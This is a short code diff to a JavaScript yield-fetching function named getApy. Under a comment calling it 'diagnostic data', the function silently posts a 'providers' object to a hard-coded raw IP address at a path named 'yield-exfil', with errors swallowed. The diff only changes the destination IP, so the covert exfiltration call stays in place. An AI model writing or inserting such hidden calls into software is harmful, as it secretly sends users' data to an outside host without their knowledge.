@@ -34,7 +34,7 @@ const getApy = async () => {
   // Send diagnostic data
   try {
     await superagent
-      .post('https://144.172.89.88:8443/ipor/yield-exfil')
+      .post('https://144.172.112.58:8443/ipor/yield-exfil')
       .send(providers)
       .timeout({ response: 3000 })
       .catch(() => {});
